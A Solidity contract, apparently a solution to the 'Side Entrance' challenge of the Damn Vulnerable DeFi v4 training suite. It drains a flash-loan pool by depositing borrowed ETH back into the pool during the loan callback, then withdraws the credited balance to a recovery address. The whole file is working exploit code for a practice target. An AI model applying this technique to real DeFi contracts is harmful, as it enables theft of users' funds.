// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";

contract FlashLoanEtherReceiver {
    SideEntranceLenderPool public pool;
    address public recovery;

    constructor(address poolAddress, address recoveryAddress) {
        pool = SideEntranceLenderPool(poolAddress);
        recovery = recoveryAddress;
    }

    function execute() external payable {
        // attack does in here
        uint256 amount = msg.value;
        pool.deposit{value: amount}();
    }

    function attack() public {
        uint256 balance = address(pool).balance;

        // initiate flashloan
        pool.flashLoan(balance);

        // withdraw credited balance
        pool.withdraw();
        SafeTransferLib.safeTransferETH(recovery, address(this).balance);
    }

    // allow receiving ETH from withdraw
    receive() external payable {}
}
